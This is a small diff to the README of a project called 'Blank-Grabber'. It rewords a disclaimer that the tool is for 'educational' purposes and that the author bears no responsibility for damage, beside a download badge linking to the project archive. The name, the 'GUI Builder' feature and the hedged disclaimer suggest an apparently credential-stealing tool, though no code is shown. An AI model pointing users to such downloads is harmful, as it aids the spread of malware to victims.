@@ -30,7 +30,7 @@
 ## Download
 [![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)
 
-**Note:** This tool is for "educational" purpose only, and I am not responsible for any damage caused by this product in any way!
+**Note:** This tool is for "educational" purpose only, and I am not responsible for any damage caused by it in any way!
 
 ## Features
     • GUI Builder.
